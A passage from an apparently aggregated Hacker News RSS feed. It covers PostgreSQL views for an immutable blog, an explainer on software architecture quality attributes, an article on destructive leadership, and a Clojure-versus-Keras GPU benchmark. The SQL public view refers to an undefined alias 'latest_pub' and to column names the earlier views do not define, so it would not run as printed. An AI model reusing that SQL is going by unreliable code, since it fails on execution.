<span>CREATE</span> <span>TABLE</span> <span>logblog</span><span>.</span><span>tag_event</span> <span>(</span>
       <span>timestamp</span> <span>TIMESTAMP</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>now</span><span>(),</span>
       <span>slug</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span> <span>REFERENCES</span> <span>logblog</span><span>.</span><span>article</span><span>,</span>
       <span>event</span> <span>logblog</span><span>.</span><span>tag_event_type</span> <span>NOT</span> <span>NULL</span><span>,</span>
       <span>tag</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span>
<span>);</span></code></pre></figure>

<h3 id="building-views">Building Views</h3>

<p>Querying this data can get quite complicated, so it is a good idea to
break it down with views that show the current state of the
application. They make heavy use of <code>DISTINCT ON</code> to find the latest
state of each component.</p>

<p>This view is the latest deletion date for an article (if applicable)</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>VIEW</span> <span>logblog</span><span>.</span><span>last_deleted_view</span> <span>AS</span>
     <span>SELECT</span> <span>DISTINCT</span> <span>ON</span> <span>(</span><span>slug</span><span>)</span> <span>timestamp</span> <span>AS</span> <span>deleted_on</span><span>,</span> <span>slug</span>
     <span>FROM</span> <span>logblog</span><span>.</span><span>article_deletion</span>
     <span>ORDER</span> <span>BY</span> <span>slug</span><span>,</span> <span>timestamp</span> <span>DESC</span><span>;</span></code></pre></figure>

<p>We will want to show users the latest published content of an article.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>VIEW</span> <span>logblog</span><span>.</span><span>last_published_view</span> <span>AS</span>
     <span>SELECT</span> <span>DISTINCT</span> <span>ON</span> <span>(</span><span>rev</span><span>.</span><span>slug</span><span>)</span>
            <span>rev</span><span>.</span><span>revision_id</span><span>,</span>
            <span>pub</span><span>.</span><span>timestamp</span> <span>AS</span> <span>last_updated_on</span><span>,</span>
            <span>rev</span><span>.</span><span>slug</span><span>,</span>
            <span>rev</span><span>.</span><span>title</span><span>,</span>
            <span>rev</span><span>.</span><span>content</span>
     <span>FROM</span> <span>logblog</span><span>.</span><span>article_publish</span> <span>AS</span> <span>pub</span>
     <span>INNER</span> <span>JOIN</span> <span>logblog</span><span>.</span><span>article_revision</span> <span>AS</span> <span>rev</span> <span>ON</span> <span>rev</span><span>.</span><span>revision_id</span> <span>=</span> <span>pub</span><span>.</span><span>revision_id</span>
     <span>ORDER</span> <span>BY</span> <span>rev</span><span>.</span><span>slug</span><span>,</span> <span>timestamp</span> <span>DESC</span><span>;</span></code></pre></figure>

<p>Another piece of useful information is when an article was first
published. This is the date you usually show on an article. The last
published timestamp shows when an article was last updated.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>VIEW</span> <span>logblog</span><span>.</span><span>first_published_view</span> <span>AS</span>
     <span>SELECT</span> <span>DISTINCT</span> <span>ON</span> <span>(</span><span>rev</span><span>.</span><span>slug</span><span>)</span>
            <span>rev</span><span>.</span><span>revision_id</span><span>,</span>
            <span>pub</span><span>.</span><span>timestamp</span> <span>AS</span> <span>first_published_on</span>
     <span>FROM</span> <span>logblog</span><span>.</span><span>article_publish</span> <span>AS</span> <span>pub</span>
     <span>INNER</span> <span>JOIN</span> <span>logblog</span><span>.</span><span>article_revision</span> <span>AS</span> <span>rev</span> <span>ON</span> <span>rev</span><span>.</span><span>revision_id</span> <span>=</span> <span>pub</span><span>.</span><span>revision_id</span>
     <span>ORDER</span> <span>BY</span> <span>rev</span><span>.</span><span>slug</span><span>,</span> <span>timestamp</span><span>;</span></code></pre></figure>

<p>Aggregate the tags as a PostgreSQL array for convenience.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>VIEW</span> <span>logblog</span><span>.</span><span>article_tag_view</span> <span>AS</span>
       <span>WITH</span> <span>last_tag_event</span> <span>AS</span>
         <span>(</span><span>SELECT</span> <span>DISTINCT</span> <span>ON</span> <span>(</span><span>slug</span><span>,</span> <span>tag</span><span>)</span> <span>*</span>
          <span>FROM</span> <span>logblog</span><span>.</span><span>tag_event</span>
          <span>ORDER</span> <span>BY</span> <span>slug</span><span>,</span> <span>tag</span><span>,</span> <span>timestamp</span> <span>DESC</span><span>)</span>
       <span>SELECT</span> <span>slug</span><span>,</span> <span>array_agg</span><span>(</span><span>tag</span><span>)</span> <span>AS</span> <span>tags</span>
       <span>FROM</span> <span>last_tag_event</span>
       <span>WHERE</span> <span>event</span> <span>=</span> <span>'add'</span>
       <span>GROUP</span> <span>BY</span> <span>slug</span><span>;</span></code></pre></figure>

<h3 id="the-publics-view">The Public’s View</h3>

<p>Here the previous views are used as building blocks to create a public
article view. Note that articles that have a deletion date later than
the last published date are not shown.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>VIEW</span> <span>logblog</span><span>.</span><span>public_article_view</span> <span>AS</span>
       <span>SELECT</span> <span>last_pub</span><span>.</span><span>slug</span><span>,</span>
              <span>first_pub</span><span>.</span><span>first_published_on</span><span>,</span>
              <span>last_pub</span><span>.</span><span>last_updated_on</span><span>,</span>
              <span>last_pub</span><span>.</span><span>title</span><span>,</span>
              <span>last_pub</span><span>.</span><span>content</span><span>,</span>
              <span>COALESCE</span><span>(</span><span>tags</span><span>.</span><span>tags</span><span>,</span> <span>'{}'</span><span>::</span><span>TEXT</span><span>[])</span> <span>AS</span> <span>tags</span>
       <span>FROM</span> <span>logblog</span><span>.</span><span>last_published_view</span> <span>AS</span> <span>last_pub</span>
       <span>LEFT</span> <span>JOIN</span> <span>logblog</span><span>.</span><span>last_deleted_view</span> <span>AS</span> <span>del</span>
            <span>ON</span> <span>del</span><span>.</span><span>slug</span> <span>=</span> <span>latest_pub</span><span>.</span><span>slug</span>
       <span>LEFT</span> <span>JOIN</span> <span>logblog</span><span>.</span><span>first_published_view</span> <span>AS</span> <span>first_pub</span>
            <span>ON</span> <span>first_pub</span><span>.</span><span>slug</span> <span>=</span> <span>latest_pub</span><span>.</span><span>slug</span>
       <span>LEFT</span> <span>JOIN</span> <span>logblog</span><span>.</span><span>article_tag_view</span> <span>AS</span> <span>tags</span>
            <span>ON</span> <span>tags</span><span>.</span><span>slug</span> <span>=</span> <span>last_pub</span><span>.</span><span>slug</span>
       <span>WHERE</span> <span>NOT</span> <span>COALESCE</span><span>(</span><span>del</span><span>.</span><span>timestamp</span> <span>&gt;</span> <span>last_pub</span><span>.</span><span>timestamp</span><span>,</span> <span>false</span><span>)</span>
       <span>ORDER</span> <span>BY</span> <span>first_pub</span><span>.</span><span>timestamp</span><span>;</span></code></pre></figure>

<h3 id="the-life-of-a-blog-post">The Life of a Blog Post</h3>

<p>To finish, a fun query to show the entire history of an article.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>VIEW</span> <span>logblog</span><span>.</span><span>article_history_view</span> <span>AS</span>
       <span>WITH</span>
        <span>revision_events</span> <span>AS</span>
        <span>(</span><span>SELECT</span> <span>timestamp</span><span>,</span>
                <span>slug</span><span>,</span>
                <span>(</span><span>'Created article revision '</span> <span>||</span> <span>revision_id</span><span>)::</span><span>TEXT</span> <span>AS</span> <span>event</span>
         <span>FROM</span> <span>logblog</span><span>.</span><span>article_revision</span><span>),</span>
        <span>publish_events</span> <span>AS</span>
        <span>(</span><span>SELECT</span> <span>pub</span><span>.</span><span>timestamp</span><span>,</span>
                <span>rev</span><span>.</span><span>slug</span><span>,</span>
                <span>(</span><span>'Published revision '</span> <span>||</span> <span>pub</span><span>.</span><span>revision_id</span><span>)::</span><span>TEXT</span> <span>AS</span> <span>event</span>
         <span>FROM</span> <span>logblog</span><span>.</span><span>article_publish</span> <span>AS</span> <span>pub</span>
         <span>INNER</span> <span>JOIN</span> <span>logblog</span><span>.</span><span>article_revision</span> <span>AS</span> <span>rev</span>
   …</code></pre></figure></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kevinmahoney.co.uk/articles/immutable-data/">https://kevinmahoney.co.uk/articles/immutable-data/</a></em></p>]]>
            </description>
            <link>https://kevinmahoney.co.uk/articles/immutable-data/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025415</guid>
            <pubDate>Sun, 08 Nov 2020 12:39:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Software Architecture]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025368">thread link</a>) | @DevTalker
<br/>
November 8, 2020 | https://ddimitrov.dev/2020/11/08/what-is-software-architecture/ | <a href="https://web.archive.org/web/*/https://ddimitrov.dev/2020/11/08/what-is-software-architecture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


			
<p>In this series of posts, I will introduce you to the most popular software architecture types. But before we delve into the most common variants, let us talk about software architecture itself.</p>



<h2><strong>What is software architecture?</strong></h2>



<p>It is tough to write simply for such a complex topic as software architecture but let me try my best.</p>



<p>A software system is made up of individual elements. Elements could be databases, application servers, message brokers, load balancers, etc.</p>



<p>Each element has its properties and characteristics. Between these elements, there are relationships.</p>



<p>The way we structure these elements and their relationships, we call software architecture.</p>



<p>By defining such a structure, we aim to gain some benefits. Quality attributes define and describe these benefits, and it is essential to remember that they are not business logic related.</p>



<p>Software architecture is the skeleton of your application. Once you start implementation, it is tough to change it, so the right decision for architecture is crucial in the early phase of the project.</p>



<h2><strong>Quality attributes</strong></h2>



<p>Though quality attributes are not functionality requirements, they mainly arise from the functional requirements.&nbsp;</p>



<p>By defining requirements for a software product, the business aims to enhance some competitive advantages.</p>



<p>In the best-case scenario, quality attributes gathering should come from those competitive advantages.</p>



<p>A simple example. Back in the days, I worked in a company that wanted to develop a new retail system. The business analysis showed that most of our main competitor’s customers do not like their system because it was always online. The user couldn’t even check product stocks in case of an internet outage.</p>



<p>For our new product to be competitive in the market, we had to aim for a competitive advantage. Our system had to work offline during internet outages and sync all recorded operations when the internet is back.</p>



<p>We, developers, translated that requirement into the <strong>availability</strong> quality attribute.</p>



<p>Sometimes quality attributes don’t come from requirements. Some quality attributes are enforced by constraints. Constraints could be different, from the dev team’s experience level to government regulations.</p>



<p>And last but not least, quality attributes should be measurable and testable.</p>



<h3><strong>Some of the most popular quality attributes:</strong></h3>



<h4>Availability</h4>



<p>It defines to what level the system is available to perform its tasks. Availability expands on the notion of reliability. Systems with high availability tend to be resilient to faults and errors (well, to most of them). High availability systems implement methods for fault detection and recovery.</p>



<h4>Modifiability</h4>



<p>Modifiability defines how well a system can adapt to changes. Technologies change, business requirements change. High modifiability software should be able to embrace new changes by reducing change costs and risks.</p>



<h4>Interoperability</h4>



<p>No system can live in total isolation. Interoperability quality attribute measures to what degree a software system can “communicate” with other software systems. Systems with high interoperability tend to have very well defined interfaces and implement widely accepted standards and communication protocols.</p>



<h4>Security</h4>



<p>The security of a system could be viewed from three different angles. &nbsp;</p>



<p>Confidentiality â€“ is the data well secured from users who don’t have the right to access it.</p>



<p>Availability â€“ is the data available when needed.</p>



<p>Integrity â€“ is the data well secured, so tampering and deletion are not possible.</p>



<h4>Performance</h4>



<p>Well, performance is all about time. This quality attribute aims to put an upper execution time limit to the system’s tasks (no matter if the user or internal mechanisms initiate them).</p>



<h4>Testability</h4>



<p>Testability defines to what degree a system can be <a href="https://ddimitrov.dev/2020/10/24/how-to-write-a-good-unit-tests/">tested</a>. How well business and technical requirements can be simulated, observed, and analyzed. High testability systems provide a high level of isolation and abstraction of its modules.</p>



<h4>Usability</h4>



<p>Usability is about how easy it is for the user to perform tasks in the system.</p>



<p>Sound simple but believe me, usability is a real pain. Usability is even bigger pain when we talk about systems with very complex business logic and processes.</p>



<p>Every user comes with his own previous experience and opinions. That’s why usability is often based on compromises for the greater good ðŸ˜Š.</p>



<p>For more comprehensive list you can check <a href="https://en.wikipedia.org/wiki/List_of_system_quality_attributes" target="_blank" rel="noreferrer noopener nofollow">this</a>.</p>



<h2><strong>What is the difference between software architecture and software design?</strong></h2>



<p>While software architecture aims to define the structure and relationships of the different system elements (considering all the present constraints), the software design focuses on their specific implementation.</p>



<p>If a software architecture specifies that we will have microservices with async internal communication, the software design will define how this will be implemented.</p>



<p>Do we use RabitMQ or Mass Transit, or something other? What is the format of our messages? How will the data models reflect the bounded context we have defined? The software design answers all these questions.</p>



<h2><strong>Architecting for performance (example)</strong></h2>



<p>Let us see how a quality attribute requirement affects system architecture.</p>



<p>We have a potential client who wants a very fast (performance quality attribute) reporting system.</p>



<p>The client should make decisions fast so that the reporting system’s speed is a competitive advantage for his business.</p>



<p>Currently, the client has two different systems. He queries them when he needs some data (using their operational databases, which degrade performance additionally) and combines the extracted data in an ugly excel report.</p>



<p>Back in the days, that approach worked perfectly for him, but now, this is becoming a bottleneck when his business is much bigger.</p>



<p>Our company “Drink beer and code Ltd.” receives invite to solve the problem.</p>



<p>After a complete analysis of the case, the developers come with the solution. According to the research, they think that a report’s average execution time could be lowered to 1500 ms (yeahâ€¦).</p>



<p>At this stage, dev team will not change current systems. Either way, they work well to meet the customer’s needs, and he doesn’t want to change them.</p>



<p>The Dev team plans to deploy a new SQL Server. The server will have a new analytics database and two replicated copies of the other systems’ operational databases.</p>



<p>Operational database replication is event-based.</p>



<p>A worker service extracts the data from the replicated databases, transforms it appropriately for the analytics database, and loads it into the analytics database.</p>



<p>The analytics database design is structured and optimized for the format of the needed reports. <a href="https://ddimitrov.dev/2020/10/04/optimizing-sql-queries-sometimes-two-queries-are-better-than-one/">Querying</a> the database will be very fast.</p>



<p>Finally, we have a reporting application reading the data over the analytics database and visualizing it in beautiful tables and charts.</p>



<h2>Summary</h2>



<p>Even with that oversimplistic example, we can see that we have introduced new elements and relationships between them to meet the desired quality attribute metric.</p>



<p>We also faced the constraint that the old systems enforced over our technical decision.</p>



<p>But in the end, we achieved the desired performance and that enhanced our client’s competitive advantage.</p>
				
		</div></div>]]>
            </description>
            <link>https://ddimitrov.dev/2020/11/08/what-is-software-architecture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025368</guid>
            <pubDate>Sun, 08 Nov 2020 12:32:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clues to identify a destructive leader]]>
            </title>
            <description>
<![CDATA[
Score 247 | Comments 106 (<a href="https://news.ycombinator.com/item?id=25025363">thread link</a>) | @BossingAround
<br/>
November 8, 2020 | https://articles.tilt365.com/identify-destructive-leadership-patterns/ | <a href="https://web.archive.org/web/*/https://articles.tilt365.com/identify-destructive-leadership-patterns/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://articles.tilt365.com/content/images/size/w300/2020/11/sharks-in-the-water-1.png 300w,
                            https://articles.tilt365.com/content/images/size/w600/2020/11/sharks-in-the-water-1.png 600w,
                            https://articles.tilt365.com/content/images/size/w1000/2020/11/sharks-in-the-water-1.png 1000w,
                            https://articles.tilt365.com/content/images/size/w2000/2020/11/sharks-in-the-water-1.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://articles.tilt365.com/content/images/size/w2000/2020/11/sharks-in-the-water-1.png" alt="4 Clues to Identify a Destructive Leader">
            </figure>

            <section>
                <div>
                    <p>In many aspects of our lives, we rely on those in positions of power to lead us. The role of leaders becomes especially salient in times of uncertainty. Throughout your life, you’ve probably seen several ways leaders can respond to challenging and ambiguous situations. A transformational leader can see the opportunities in turmoil and inspire people to follow them to a better future. On the other hand, an incompetent leader will leave you to deal with everything alone. In the worst-case scenario, a destructive leader will see the potential for self-enhancement and exploit others to maximize their gain. </p><figure><img src="https://articles.tilt365.com/content/images/2020/11/four-patterns-of-destructive-leadership.png" alt="" srcset="https://articles.tilt365.com/content/images/size/w600/2020/11/four-patterns-of-destructive-leadership.png 600w, https://articles.tilt365.com/content/images/size/w1000/2020/11/four-patterns-of-destructive-leadership.png 1000w, https://articles.tilt365.com/content/images/2020/11/four-patterns-of-destructive-leadership.png 1069w" sizes="(min-width: 720px) 720px"><figcaption>4 Clues to Identify a Destructive Leader</figcaption></figure><h3 id="people-leave-managers-not-companies-">People leave managers, not companies.</h3><p>Incompetent and destructive leaders both create negative consequences, but the distinction between the two is essential. An incompetent leader may lack the compelling charisma to engage others to follow, but we wouldn’t call someone lacking charisma actively destructive. A <a href="https://www.oxfordhandbooks.com/view/10.1093/oxfordhb/9780199755615.001.0001/oxfordhb-9780199755615-e-014">destructive leader</a> intentionally and systematically behaves in a way that violates the organization’s members and stakeholders’ best interests. The extent of damage that a destructive leader can cause often goes unnoticed until it is too late (e.g., Enron), but there are clues you can look for to help you identify destructive leaders earlier. These clues reflect behaviors and attitudes that can reveal the destructive nature of an otherwise seemingly competent leader.</p><h3 id="what-causes-destructive-leadership-patterns">What causes destructive leadership patterns?</h3><p>Everyone has some characteristics that are annoying to someone who prefers a different way of behaving and working. These characteristics are inherited in our DNA and influenced by the environment in which we grew up. The genetic influence was passed down from generation to generation and is a product of evolution that helped your ancestors survive the environments they encountered. And they can help you too, as long as they don’t become distorted from early experiences of chronic fear. </p><p>In destructive leadership, typical behavior patterns become distorted into extremes powered by the brain’s more primitive parts under such circumstances. When this happens, we are in fear-mode, and a blend of fear reactions becomes our norm. These distorted patterns become habitual, and our responses to others become unhealthy. For example, suppose we experienced excessive criticism in our early development. In that case, our ego will record a perception of being diminished by important caregivers and sense that our very survival depends on not being criticized. In this case, we may learn to strive excessively for superiority to alleviate the fear of feeling inferior in our assessment of ourselves.</p><p>While a reactive pattern like this helped us survive the precise environment we were born into, in a global world, that same pattern may not. The brain’s brilliant design constructs a set of behaviors that will ensure our survival in whatever we experience in the development years to maturity. But if we move to an entirely new environment as an adult, the patterns that served us before may not translate into helpful practices somewhere else. </p><h3 id="the-reason-anxiety-and-stress-are-at-an-all-time-high-">The reason anxiety and stress are at an all-time high.</h3><p>In the last century, this phenomenon has become even more complicated. With the advancement of technology comes exposure to human systems all over the world. Transportation enables moving to any part of the globe in a day or two. As we move about rapidly from one culture to another, we find ourselves unable to understand why we are perceived positively in one environment and the opposite in another. No wonder anxiety and stress are at an all-time high, especially for those who interact in global companies. Adaptation to other cultures becomes a necessity, making self-awareness and emotional intelligence some of the most critical skill sets of our time. </p><h3 id="first-look-for-the-underlying-intention-">First, look for the underlying intention.</h3><p>Because all human systems are imperfect, and most parents do the best they can do, many of us have traces of fear behaviors that can drive others nuts. There are a few prototypical examples of these types of behaviors, including, but not limited to </p><ul><li>The constant worrier who is always second-guessing themselves,</li><li>The storyteller who seems to live in an ideal world no one else can relate to,</li><li>The dominant driver who wants everything to go their way,</li><li>The prideful judge who doesn’t realize they can’t possibly know everything there is to know about everything. </li></ul><p>When we’re talking about destructive leadership, we’re not merely referring to annoying habits unless they have become very extreme or painfully frequent. Destructive leaders have little interest in how they are perceived, so they are rarely interested in how they could improve. </p><h3 id="destructive-leaders-are-single-mindedly-self-interested-">Destructive leaders are single-mindedly self-interested.</h3><p>Generally, healthy leaders may have annoying habits, but when you look beneath the surface, two things are different: </p><ol><li>They adopt a mindset that conveys they care about their impact on others and are willing to listen, learn, and exert the choice and character to change.</li><li>They hold a positive intention toward others and work for the good of the mission and the enterprise they serve. </li></ol><p>On the other hand, destructive leaders are either:</p><ol><li>Un-coachable because they adopt a rigid mindset that conveys they don’t care about their impact on others and will use their authority to manipulate others to bend to their will. They imply, “I am who I am, so deal with it.”</li><li>They have a hidden ulterior motive for wanting and using power to serve themselves at the expense of others, the mission, or the enterprise. </li></ol><p>So, as we lay out the four clues of destructive leaders, keep two things in mind. Do you have a hunch that they are well-intended, and are they willing to work on themselves? If the answer to both is affirmative, they are probably not destructive, but just like you and me, they are trying to serve their company and grow as best they can. In these circumstances, we can mind our own business and work on our self-improvement plan rather than thinking about how annoying they are. After all, it’s temporary unless they are genuinely destructive. And then you must do everything in your power to remove them from your company, or they could take the whole thing down. </p><h3 id="clue-1-behaviors-or-words-that-imply-i-m-kind-of-a-big-deal-">Clue 1: Behaviors or words that imply “I’m kind of a big deal!”</h3><p><strong>Excessive fabrication and exaggeration that is nowhere near the truth. </strong></p><p>This destructive pattern arises from an inner identity that seeks to resolve a childhood dilemma about not getting enough attention from caregivers, so they do not feel special. This dilemma results in insatiable attention-seeking and an inflated need to be special, unique, or novel. The inner fear is feeling trapped in the loneliness or sadness of not being “special” enough to those who matter. Because they perceive being attention-deprived or unworthy, they feel shame, and it becomes so painful, they rebel from authority figures whom they believe could not be trusted. Instead of following appropriately, they become rebellious and provocative, conning others to go along with their fantastic plans. </p><h3 id="clues-you-will-notice-">Clues you will notice: </h3><ul><li>Exaggeration of the truth to the point of fantasy</li><li>Unapologetic self-promoting and self-aggrandizing</li><li>Excessive talking to dominate others</li><li>Pontification and fabrication of elaborate stories</li><li>Disrespect for authority figures</li><li>Disregard for rules that are contrary to their aims</li><li>Automatically dismiss ideas from others</li><li>An insatiable need to be the center of attention</li><li>Terminally individualistic, unique, or novel</li><li>External image is unusually extreme in some way</li></ul><h3 id="results-in-a-chaotic-climate">Results in a Chaotic Climate</h3><p>These destructive leaders are challenging to work with because they demand attention but don’t want the restrictions that come with being front and center. When they are in the limelight, it can be exceedingly uncomfortable because they also unconsciously fail to believe they are impressive enough. So they attract attention, initiate excessive activity, and then thwart the attention this draws. This pattern makes them unpredictable, so the shadow of the climate they create around them is chaotic and confusing for others. </p><h3 id="clue-2-behaviors-or-words-that-imply-none-of-this-is-my-fault-">Clue 2: Behaviors or words that imply “None of this is my fault!”</h3><p><strong>Excessive conflict-avoidance by deflecting personal responsibility. </strong></p><p>This destructive pattern arises from an inner identity that seeks to resolve a childhood dilemma about not getting enough approval and acceptance. This dilemma results in insatiable approval-seeking and an excessive need to be liked by everyone, even strangers. The inner fear is to be rejected or ridiculed by others as unlovable by those who matter. Because they perceive being unacceptable to others, they feel powerless and unworthy of care. This experience can become painful and they are unable to communicate or ask others for what they need because they don’t feel they deserve it. They defer to those in authority roles and suffer quietly in dependence, hopelessness, and seen as “needy” for any shred of approval. </p><h3 id="clues-you-will-notice--1">Clues you will notice:</h3><ul><li>Complaining, blaming, gossiping about others</li><li>Disgruntled resentment of those in authority</li><li>Giving up their power and being dependent on others</li><li>Come across as “needy” and draining</li><li>Asking others to decide and then resenting it</li><li>Avoiding leadership to avoid culpability later</li><li>Unconsciously inviting others to dominate them</li><li>Blaming others for being the “bully”</li><li>Desire to be the “nice” or “good” one</li><li>An insatiable need to be liked, accepted, included</li></ul><h3 id="results-in-a-conflict-averse-climate">Results in a Conflict Averse Climate </h3><p>These destructive leaders are challenging to work with because they put extreme energy into taking care of or helping others with an unstated expectation that there will be a reward in return. For example, they take care of someone with the expectation that the other person will take the responsibility of making decisions for them. However, they may not tell the other person this expectation. There is an unconscious …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://articles.tilt365.com/identify-destructive-leadership-patterns/">https://articles.tilt365.com/identify-destructive-leadership-patterns/</a></em></p>]]>
            </description>
            <link>https://articles.tilt365.com/identify-destructive-leadership-patterns/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025363</guid>
            <pubDate>Sun, 08 Nov 2020 12:30:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clojure: Going Faster Than TensorFlow on the GPU (GTX 1080Ti)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025262">thread link</a>) | @tosh
<br/>
November 8, 2020 | https://dragan.rocks/articles/20/Going-faster-than-Tensorflow-on-GPU-with-Clojure | <a href="https://web.archive.org/web/*/https://dragan.rocks/articles/20/Going-faster-than-Tensorflow-on-GPU-with-Clojure">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
You can <a href="https://www.patreon.com/posts/22476035">adopt a pet function!</a>
Support my work <a href="https://patreon.com/draganrocks">on my Patreon page</a>, and access my <a href="https://www.patreon.com/posts/im-ditching-and-22476348">dedicated discussion server</a>. Can't afford to <a href="https://patreon.com/draganrocks">donate</a>? Ask for a free invite.
<p>November 2, 2020</p>
<p>
    Please share: .
</p>

<p>
    <a href="https://aiprobook.com/">New books are available for subscription.</a>
    </p><p><a href="https://aiprobook.com/deep-learning-for-programmers">
            <img src="http://aiprobook.com/img/dlfp-cover.png">
        </a>
        <a href="https://aiprobook.com/numerical-linear-algebra-for-programmers">
            <img src="http://aiprobook.com/img/lafp-cover.png">
        </a>
    </p>


<p>
A few weeks ago I've shown you how simple Clojure's
<a href="https://github.com/uncomplicate/deep-diamond">Deep Diamond</a>() is, even compared to Keras. I've also mentioned
that it's superfast. Here's how fast it is on the GPU!
</p>

<div id="outline-container-orgc0a2ae3">
<h2 id="orgc0a2ae3">TL;DR Much faster than Keras+TensorFlow on the GPU, too!</h2>
<div id="text-orgc0a2ae3">
<p>
In the <a href="https://dragan.rocks/articles/20/Going-faster-than-TensorFlow-with-Clojure">previous article</a>, we have only compared the libraries on the CPU.
Deep Diamond was considerably faster: 368 seconds vs 509 seconds. Most readers were intrigued,
but, being skeptical as they should be, they complained that CPU performance doesn't matter
anyway, since everybody uses GPU for training convolution networks;
let's do the GPU comparison then.
</p>

<p>
Both Deep Diamond, and Keras with TensorFlow, use <a href="https://developer.nvidia.com/cudnn">Nvidia's cuDNN</a> low level performance
library under the hood, and any difference is due to the higher-level implementation.
</p>

<p>
Deep Diamond completes this training in <b>21</b> seconds while Keras + TensorFlow takes <b>35</b> seconds.
The gap even increased in favor of Deep Diamond! Now the ratio is <b>1.67</b>, in place of 1.38 on the CPU.
</p>
</div>
</div>

<div id="outline-container-org0601d75">
<h2 id="org0601d75">Keras CNN in Python</h2>
<div id="text-org0601d75">
<p>
I repeat the relevant model code for reference. We're
interested in the running time of <code>model.fit</code>, with minimal verbosity,
for 12 epochs. I'm using Nvidia's GTX 1080Ti GPU. Keras code is taken from official Keras examples.
</p>

<div>
<pre>model = Sequential<span>()</span>
model.add<span>(</span>Conv2D<span>(</span>32, kernel_size=<span>(</span>3, 3<span>)</span>,
                 activation='relu',
                 input_shape=<span>(</span>28, 28, 1<span>)</span><span>)</span><span>)</span>
model.add<span>(</span>Conv2D<span>(</span>64, <span>(</span>3, 3<span>)</span>, activation='relu'<span>)</span><span>)</span>
model.add<span>(</span>MaxPooling2D<span>(</span>pool_size=<span>(</span>2, 2<span>)</span><span>)</span><span>)</span>
model.add<span>(</span>Dropout<span>(</span>0.25<span>)</span><span>)</span>
model.add<span>(</span>Flatten<span>()</span><span>)</span>
model.add<span>(</span>Dense<span>(</span>128, activation='relu'<span>)</span><span>)</span>
model.add<span>(</span>Dropout<span>(</span>0.5<span>)</span><span>)</span>
model.add<span>(</span>Dense<span>(</span>num_classes, activation='softmax'<span>)</span><span>)</span>

model.compile<span>(</span>loss=keras.losses.categorical_crossentropy,
              optimizer=Adam<span>(</span>learning_rate=0.01<span>)</span>,
              metrics=<span>[</span>'accuracy'<span>]</span><span>)</span>

s = time.time_ns<span>()</span>
model.fit<span>(</span>x_train, y_train,
          batch_size=128,
          verbose=2,
          epochs=12<span>)</span>
e = time.time_ns<span>()</span>
print<span>(</span><span>(</span>e-s<span>)</span>/<span>(</span>10**9<span>)</span>, <span>" seconds"</span><span>)</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org7c1e24e">
<h2 id="org7c1e24e">Deep Diamond CNN in Clojure</h2>
<div id="text-org7c1e24e">
<p>
In Clojure, we're measuring the runtime of the <code>train</code> function.
</p>

<div>
<pre><span>(</span><span>defonce</span> <span>net-bp</span>
  <span>(</span>network <span>(</span>desc <span>[</span>128 1 28 28<span>]</span> <span>:float</span> <span>:nchw</span><span>)</span>
           <span>[</span><span>(</span>convo <span>[</span>32<span>]</span> <span>[</span>3 3<span>]</span> <span>:relu</span><span>)</span>
            <span>(</span>convo <span>[</span>64<span>]</span> <span>[</span>3 3<span>]</span> <span>:relu</span><span>)</span>
            <span>(</span>pooling <span>[</span>2 2<span>]</span> <span>:max</span><span>)</span>
            <span>(</span>dropout<span>)</span>
            <span>(</span>dense <span>[</span>128<span>]</span> <span>:relu</span><span>)</span>
            <span>(</span>dropout<span>)</span>
            <span>(</span>dense <span>[</span>10<span>]</span> <span>:softmax</span><span>)</span><span>]</span><span>)</span><span>)</span>

<span>(</span><span>defonce</span> <span>net</span> <span>(</span>init! <span>(</span>net-bp <span>:adam</span><span>)</span><span>)</span><span>)</span>

<span>(</span>time <span>(</span>train net train-images y-train <span>:crossentropy</span> 12 <span>[]</span><span>)</span><span>)</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-orgf9c6799">
<h2 id="orgf9c6799">The books</h2>
<div id="text-orgf9c6799">
<p>
The book <a href="https://aiprobook.com/deep-learning-for-programmers/">Deep Learning for Programmers: An Interactive Tutorial with
CUDA, OpenCL, DNNL, Java, and Clojure</a> teaches the nuts and bolts of neural networks and deep learning
by showing you how Deep Diamond is built, <b>from scratch</b>, in interactive sessions. Each line of code
can be executed and the results inspected in the plain Clojure REPL. The best way to master something is to build
it yourself!
</p>

<p>
It' simple. But fast and powerful!
</p>

<p>
Please subscribe, read the drafts, get the full book soon, and support my work on this free open source library.
</p>
</div>
</div>


    </article></div>]]>
            </description>
            <link>https://dragan.rocks/articles/20/Going-faster-than-Tensorflow-on-GPU-with-Clojure</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025262</guid>
            <pubDate>Sun, 08 Nov 2020 12:14:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing Terraform, but with TypeScript]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025186">thread link</a>) | @juliankrispel
<br/>
